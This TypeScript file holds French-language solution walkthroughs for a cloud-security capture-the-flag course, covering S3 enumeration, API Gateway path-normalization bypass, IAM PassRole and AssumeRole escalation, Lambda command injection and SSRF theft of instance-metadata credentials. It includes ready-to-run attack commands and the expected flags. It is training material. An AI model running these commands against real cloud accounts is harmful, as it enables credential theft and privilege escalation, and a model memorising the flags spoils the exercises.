import { ChallengeGuide } from '../guides';

export const guides: Record<string, ChallengeGuide> = {
  // 1.1.1
  '1.1.1': {
    context: "La première étape lors d'un test d'intrusion cloud consiste à cartographier la surface d'attaque externe. Les buckets S3 mal configurés sont une des vulnérabilités les plus courantes.",
    objective: "Identifier et lister le contenu d'un bucket S3 public exposé sans aucune authentification.",
    concepts: ["Amazon S3", "AWS CLI", "Reconnaissance", "Accès Anonyme"],
    steps: [
      {
        title: "Énumération des buckets S3 publics",
        detail: "Utilisez la commande AWS CLI pour lister tous les buckets accessibles en mode anonyme (sans identifiants). L'environnement utilise un simulateur local sur le port 9000.",
        command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 ls"
      },
      {
        title: "Exploration du bucket cible",
        detail: "La commande précédente a révélé un bucket intéressant nommé 'pce-corp-backups'. Explorons son contenu de manière récursive.",
        command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 ls s3://pce-corp-backups --recursive"
      },
      {
        title: "Récupération du flag",
        detail: "Un fichier de configuration a été trouvé. Affichez son contenu directement dans la console pour y lire le flag attendu. Le flag attendu est **PCE{s3_public_bucket_recon_2024}**.",
        command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 cp s3://pce-corp-backups/backups/old-config.env -"
      }
    ]
  },
  // 1.1.2
  '1.1.2': {
    context: "Certains services AWS peuvent fuiter des informations sur l'infrastructure même sans authentification si des permissions excessives sont appliquées au groupe 'All Users'.",
    objective: "Utiliser l'AWS CLI sans configuration pour énumérer des ressources cloud exposées.",
    concepts: ["AWS CLI", "Unauthenticated Access", "Reconnaissance Cloud"],
    steps: [
      {
        title: "Configuration de l'environnement",
        detail: "Assurez-vous qu'aucune clé d'accès AWS n'est configurée dans votre environnement pour simuler un attaquant externe non authentifié.",
        command: "unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN"
      },
      {
        title: "Énumération des ressources",
        detail: "Lancez une requête d'énumération non authentifiée vers le bucket cible découvert (pceroot-public-assets) pour vérifier son accès.",
        command: "aws s3 ls s3://pceroot-public-assets/ --no-sign-request"
      },
      {
        title: "Récupération du flag",
        detail: "Le fichier flag.txt est présent dans le bucket. Affichez son contenu. Le flag attendu est **PCE{unauth_s3_buck3t_enum_2026}**.",
        command: "aws s3 cp s3://pceroot-public-assets/flag.txt - --no-sign-request"
      }
    ]
  },
  // 1.1.3
  '1.1.3': {
    context: "API Gateway est souvent utilisé pour exposer des services internes. Si l'authentification est mal configurée, des endpoints peuvent être accessibles publiquement.",
    objective: "Découvrir et interagir avec un endpoint API Gateway non protégé.",
    concepts: ["API Gateway", "REST API", "Missing Authentication"],
    steps: [
      {
        title: "Reconnaissance de l'API",
        detail: "Récupérez et analysez la documentation Swagger pour identifier les endpoints exposés sur l'API Gateway locale.",
        command: "curl -s http://localhost:8080/swagger.json"
      },
      {
        title: "Exploitation de l'endpoint vulnérable",
        detail: "L'analyse a révélé un endpoint contenant le flag non protégé par l'API Gateway. Accédez-y directement. Le flag attendu est **PCE{api_gw_unprotected_2026}**.",
        command: "curl -s http://localhost:8080/admin/flag"
      }
    ]
  },
  // 1.1.4
  '1.1.4': {
    context: "Avant d'interagir avec les cibles, les attaquants utilisent des sources d'informations publiques pour découvrir des ressources cloud associées à une entreprise.",
    objective: "Utiliser des techniques de reconnaissance passive (Certificate Transparency, OSINT) pour trouver des infrastructures cloud.",
    concepts: ["OSINT", "Certificate Transparency", "Passive Recon"],
    steps: [
      {
        title: "Recherche d'informations",
        detail: "Utilisez l'outil de reconnaissance fourni pour identifier les actifs exposés par MegaCloudCorp.",
        command: "recon_tool MegaCloudCorp"
      },
      {
        title: "Exploration du bucket découvert",
        detail: "L'outil a révélé un bucket S3 associé. Utilisez le client S3 simulé pour lister son contenu.",
        command: "s3_client ls megacloudcorp-public-backup"
      },
      {
        title: "Récupération du flag",
        detail: "Téléchargez le fichier contenant le flag et affichez-le. Le flag attendu est **PCE{passive_recon_reveals_all_2024}**.",
        command: "s3_client cp megacloudcorp-public-backup/secret_flag.txt . && cat secret_flag.txt"
      }
    ]
  },
  // 1.2.1
  '1.2.1': {
    context: "Même si un bucket S3 ne permet pas de lister son contenu (`s3:ListBucket`), il est possible d'y lire des fichiers si l'on connaît ou devine leur nom exact et que la permission `s3:GetObject` est publique.",
    objective: "Exfiltrer des fichiers cachés depuis un bucket S3 public dont l'énumération est désactivée.",
    concepts: ["Amazon S3", "Data Exfiltration", "Hidden Prefix", "Brute Force"],
    steps: [
      {
        title: "Tentative d'énumération (Échec partiel attendu)",
        detail: "Vous savez que le bucket 'pce-marketing-public' existe. Si vous essayez de le lister récursivement pour tout voir d'un coup, vous verrez seulement la surface car le listage n'est pas autorisé.",
        command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 ls s3://pce-marketing-public --recursive"
      },
      {
        title: "Exfiltration du fichier caché",
        detail: "Un prefix interne a été deviné (ou fuité). Vous pouvez télécharger le fichier spécifique sans avoir besoin de lister le bucket entier. Le flag attendu est **PCE{s3_exfil_hidden_prefix_2024}**.",
        command: "aws --no-sign-request --endpoint-url http://localhost:9000 s3 cp s3://pce-marketing-public/internal/hr/employees-export.csv -"
      }
    ]
  },
  // 1.2.2
  '1.2.2': {
    context: "Les API Gateways utilisent parfois des règles basées sur les chemins (path-based routing) qui peuvent être contournées via des techniques de normalisation (path traversal, URL encoding).",
    objective: "Contourner l'authentification d'une API Gateway en exploitant une faille de normalisation de chemin.",
    concepts: ["API Gateway", "Auth Bypass", "Path Normalization", "Web Attacks"],
    steps: [
      {
        title: "Accès refusé sur l'endpoint protégé",
        detail: "Un accès direct à `/admin` renverra un code 401 ou 403 car il exige une authentification.",
        command: "curl -I http://localhost:8080/admin"
      },
      {
        title: "Contournement via normalisation",
        detail: "Utilisez des séquences comme `../` pour atteindre l'endpoint protégé via un endpoint public (comme `/public`). L'API Gateway interprétera mal la requête tandis que le backend résoudra le chemin vers `/admin`. Le flag attendu est **PCE{api_gateway_path_normalization_bypass_2024}**.",
        command: "curl -s 'http://localhost:8080/public/..%2fadmin'"
      }
    ]
  },
  // 1.2.3
  '1.2.3': {
    context: "Une base de données (RDS) doit toujours être déployée dans un sous-réseau privé. Lorsqu'elle est exposée publiquement et protégée par des identifiants faibles, elle devient une cible facile.",
    objective: "Se connecter à une base de données RDS exposée sur Internet.",
    concepts: ["Amazon RDS", "Public Exposure", "Database Security"],
    steps: [
      {
        title: "Énumération de l'instance RDS",
        detail: "Récupérez les informations de la base de données via l'API AWS pour découvrir son adresse IP publique (endpoint).",
        command: "aws rds describe-db-instances"
      },
      {
        title: "Connexion à la base de données",
        detail: "Utilisez le client MySQL avec les identifiants récupérés dans la configuration applicative pour vous connecter à l'endpoint RDS trouvé (remplacez `<rds_endpoint>` par l'adresse obtenue) et extraire les données secrètes. Le flag attendu est **PCE{rds_pUbl1c_2024}**.",
        command: "mysql -h <rds_endpoint> -u admin -padmin123 -e 'SELECT * FROM secrets;'"
      }
    ]
  },
  // 1.2.4
  '1.2.4': {
    context: "Les Security Groups agissent comme des pare-feu virtuels. Autoriser le trafic entrant depuis `0.0.0.0/0` (Internet) sur des ports inattendus expose l'infrastructure.",
    objective: "Identifier et exploiter un service exposé à cause d'un Security Group trop permissif.",
    concepts: ["Security Groups", "Firewall Rules", "Network Exposure"],
    steps: [
      {
        title: "Analyse du Security Group",
        detail: "Utilisez l'interface AWS CLI pour inspecter les règles du Security Group attaché et identifier le port laissé ouvert sur Internet.",
        command: "aws ec2 describe-security-groups"
      },
      {
        title: "Exploitation du service exposé",
        detail: "Connectez-vous au service (une API HTTP tournant sur le port 8080) découvert via le Security Group trop permissif pour récupérer le flag. Le flag attendu est **PCE{cloud_sg_too_permissive_2024}**.",
        command: "curl http://localhost:8080"
      }
    ]
  },
  // 1.3.1
  '1.3.1': {
    context: "La permission `iam:PassRole` permet de transmettre un rôle à un service AWS (ex: EC2, Lambda). Couplée à des droits comme `iam:CreateAccessKey` ou `ec2:RunInstances`, elle mène à une escalade de privilèges.",
    objective: "Exploiter les permissions PassRole et CreateAccessKey pour obtenir un accès administrateur.",
    concepts: ["IAM Privilege Escalation", "PassRole", "CreateAccessKey"],
    steps: [
      {
        title: "Reconnaissance IAM",
        detail: "Vérifiez vos permissions et listez les rôles IAM disponibles pour trouver un profil administrateur (`admin-profile`) que vous pouvez assigner.",
        command: "aws iam list-roles"
      },
      {
        title: "Exploitation de PassRole",
        detail: "Utilisez `ec2:RunInstances` en passant le rôle d'administration cible à la nouvelle instance. Cela valide la première étape de l'escalade.",
        command: "aws ec2 run-instances --image-id ami-pce --iam-instance-profile Name=admin-profile"
      },
      {
        title: "Création d'une clé d'accès",
        detail: "Grâce à l'escalade effectuée, vous avez désormais le droit de générer de nouvelles clés d'accès (Access Key) pour l'utilisateur de service admin `admin-svc`. Le flag attendu est **PCE{passrole_createaccesskey_escalation_2024}**.",
        command: "aws iam create-access-key --user-name admin-svc"
      }
    ]
  },
  // 1.3.2
  '1.3.2': {
    context: "La permission `sts:AssumeRole` permet à une identité de prendre temporairement les droits d'un rôle. Si un rôle est mal configuré (Trust Policy permissive), n'importe qui peut l'assumer.",
    objective: "Pivoter vers un autre compte ou obtenir des droits supérieurs via l'abus de AssumeRole.",
    concepts: ["AssumeRole", "IAM Trust Policies", "Lateral Movement"],
    steps: [
      {
        title: "Assumer le rôle vulnérable",
        detail: "Exécutez la commande `assume-role` pour obtenir les identifiants temporaires du rôle `admin-role`.",
        command: "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin-role --role-session-name PivotSession"
      },
      {
        title: "Récupération du flag avec la nouvelle identité",
        detail: "Utilisez les clés générées (AccessKeyId, SecretAccessKey, SessionToken) que vous venez de recevoir pour accéder au bucket secret et récupérer le flag. Le flag attendu est **PCE{assume_role_pivot_2024}**.",
        command: "AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 cp s3://secret-bucket/flag.txt -"
      }
    ]
  },
  // 1.3.3
  '1.3.3': {
    context: "Les fonctions AWS Lambda exécutent du code en réponse à des événements. Si l'entrée n'est pas assainie, elle peut mener à une exécution de commandes (RCE) dans l'environnement de la Lambda.",
    objective: "Exploiter une injection de commande dans une fonction Lambda pour exécuter du code arbitraire.",
    concepts: ["AWS Lambda", "Command Injection", "Serverless Security"],
    steps: [
      {
        title: "Exploitation de l'injection de commande",
        detail: "Invoquez la fonction Lambda en injectant une commande système dans le paramètre cible. La commande `cat /home/lambda_user/flag.txt` lira le flag. Affichez ensuite la réponse renvoyée. Le flag attendu est **PCE{lambda_cmd_injection_2026}**.",
        command: "aws lambda invoke --function-name NetworkTest --payload '{\"target\": \"127.0.0.1; cat /home/lambda_user/flag.txt\"}' out.json && cat out.json"
      }
    ]
  },
  // 1.4.1
  '1.4.1': {
    context: "IMDSv1 (Instance Metadata Service) permet à une instance EC2 de requêter ses métadonnées à l'IP `169.254.169.254`. Une faille SSRF dans une application web sur l'EC2 permet à un attaquant de lire ces données.",
    objective: "Exploiter une SSRF pour atteindre l'IMDSv1 et voler les credentials IAM (rôle EC2).",
    concepts: ["SSRF", "IMDSv1", "Credentials Theft", "EC2 Metadata"],
    steps: [
      {
        title: "Découverte du nom du rôle IAM",
        detail: "Utilisez la vulnérabilité SSRF (`/fetch?url=`) pour lister le nom du rôle attaché à l'instance via le service de métadonnées.",
        command: "curl 'http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
      },
      {
        title: "Vol des identifiants (STS)",
        detail: "Récupérez les AccessKey, SecretKey et SessionToken du rôle découvert (`pce-app-role`). Le flag attendu est **PCE{imds_ssrf_stolen_role_creds_2024}**.",
        command: "curl 'http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pce-app-role'"
      }
    ]
  },
  // 1.4.2
  '1.4.2': {
    context: "IMDSv2 ajoute une couche de sécurité en exigeant un header `X-aws-ec2-metadata-token`. Toutefois, si la vulnérabilité SSRF permet d'injecter ou de contrôler les headers HTTP (ex: paramètre header de l'app), IMDSv2 peut être contourné.",
    objective: "Contourner IMDSv2 via l'injection de headers dans une requête SSRF.",
    concepts: ["SSRF", "IMDSv2", "Header Injection", "Bypass"],
    steps: [
      {
        title: "Génération du token IMDSv2",
        detail: "Exploitez l'application pour envoyer une requête `PUT` vers l'endpoint de token avec le header requis `X-aws-ec2-metadata-token-ttl-seconds`.",
        command: "curl 'http://127.0.0.1:8080/fetch?url=http://127.0.0.1:9090/latest/api/token&method=PUT&header=X-aws-ec2-metadata-token-ttl-seconds:21600'"
      },
      {
        title: "Utilisation du token pour l'exfiltration",
        detail: "Réutilisez le token récupéré dans une nouvelle requête SSRF en l'incluant dans les headers pour accéder aux credentials du rôle `admin`. Le flag attendu est **PCE{1mdsv2_byp4ss_h34d3rs_2026}**.",
        command: "curl \"http://127.0.0.1:8080/fetch?url=http://127.0.0.1:9090/latest/meta-data/iam/security-credentials/admin&header=X-aws-ec2-metadata-token:<TOKEN_OBTENU>\""
      }
    ]
  },
  // 1.4.3
  '1.4.3': {
    context: "Même si l'accès à l'IMDS depuis l'extérieur est bloqué, une SSRF peut toujours être utilisée pour rebondir (pivoter) vers des services internes inaccessibles depuis Internet.",
    objective: "Utiliser une SSRF pour interagir avec un service interne au VPC.",
    concepts: ["SSRF", "Internal Network Pivot", "VPC Security"],
    steps: [
      {
        title: "Énumération via SSRF",
        detail: "Utilisez la SSRF exposée sur le port 8000 pour atteindre le service de métadonnées interne simulé sur `127.0.0.1:8080`.",
        command: "curl 'http://localhost:8000/proxy?url=http://127.0.0.1:8080/latest/meta-data/'"
      },
      {
        title: "Accès au service interne",
        detail: "Interagissez avec le chemin des credentials pour récupérer les clés d'accès. L'application bloque l'accès direct par curl, mais permet l'accès via son propre proxy. Le flag attendu est **PCE{ssrf_m3t4d4t4_2026}**.",
        command: "curl 'http://localhost:8000/proxy?url=http://127.0.0.1:8080/latest/meta-data/iam/security-credentials/ec2-role'"
      }
    ]
  }
};
